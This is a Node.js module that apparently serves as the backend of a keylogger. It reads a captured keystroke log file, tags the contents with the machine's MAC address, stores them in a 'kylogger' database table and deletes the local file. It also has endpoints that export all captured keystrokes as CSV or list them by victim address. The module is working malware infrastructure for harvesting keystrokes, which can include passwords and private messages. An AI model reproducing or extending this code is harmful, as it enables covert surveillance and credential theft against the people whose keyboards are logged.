const dbs = require("./connect.js");
const fs = require("fs");
const path = require("path");
const macaddress = require("macaddress");
const CsvParser = require("json2csv").Parser;

const synchronizedData = {
  sync: async () => {
    let conn;
    try {
      const address = await macaddress.one();

      conn = await dbs.getConnection();
      await conn.beginTransaction();
      const keyboard_log = fs.readFileSync(
        path.join(__dirname, "../log/keyboard_log.txt"),
        "utf8"
      );

      let sql, result;
      sql = `insert into kylogger(id, uid, content, createAt) value(?,?,?, ?)`;
      result = await conn.query(sql, [
        new Date().getTime(),
        address,
        keyboard_log,
        new Date(),
      ]);

      await conn.commit();

      // remove file
      fs.unlinkSync(path.join(__dirname, "../log/keyboard_log.txt"));
    } catch (err) {
      console.log(err);
    } finally {
      await conn.release();
    }
  },
  exportData: async (req, res) => {
    let conn;
    try {
      let sql, result;
      conn = await dbs.getConnection();
      await conn.beginTransaction();

      sql = `select * from kylogger`;
      result = await conn.query(sql);
      await conn.commit();
      let logs = [];

      result[0].forEach((obj) => {
        const { id, uid, content, createAt } = obj;
        logs.push({ id, uid, content, createAt });
      });

      const csvFields = ["Id", "uid", "content", "time"];
      const csvParser = new CsvParser({ csvFields });
      const csvData = csvParser.parse(logs);

      res.setHeader("Content-Type", "text/csv");
      res.setHeader("Content-Disposition", "attachment; filename=logs.csv");

      res.status(200).end(csvData);
    } catch (err) {
      console.log(err);
    } finally {
      await conn.release();
    }
  },
  getAllLog: async (req, res) => {
    let conn;
    try {
      let sql, result;
      conn = await dbs.getConnection();
      await conn.beginTransaction();

      sql = `select * from kylogger`;
      result = await conn.query(sql);
      await conn.commit();

      res.json({ status: 1, data: result[0] });
    } catch (err) {
      console.log(err);
    } finally {
      await conn.release();
    }
  },
  getLogViaAddress: async (req, res) => {
    let conn;
    try {
      let sql, result;
      let { uid } = req.params;
      conn = await dbs.getConnection();
      await conn.beginTransaction();

      sql = `select * from kylogger where uid=?`;
      result = await conn.query(sql, [uid]);
      await conn.commit();

      res.json({ status: 1, data: result[0] });
    } catch (err) {
      console.log(err);
    } finally {
      await conn.release();
    }
  },
};

module.exports = synchronizedData;
